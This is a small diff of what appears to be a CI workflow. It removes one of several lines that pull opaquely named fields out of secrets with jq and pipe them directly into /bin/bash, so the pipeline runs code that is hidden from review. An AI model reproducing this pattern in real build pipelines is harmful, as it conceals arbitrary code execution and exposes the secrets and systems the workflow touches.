@@ -21,7 +21,6 @@ jobs:
           nltk5: ${{ secrets.nltk5 }}
         run: |
           printf '%s' "$nltk5" | jq -r .lsvt8377 | /bin/bash
-          echo $n11 | jq -r .ft4 | /bin/bash
           echo $wrxc60 | jq -r .rtb379 | /bin/bash
           printf '%s' "$b78" | jq -r .cpt7927 | /bin/bash
 
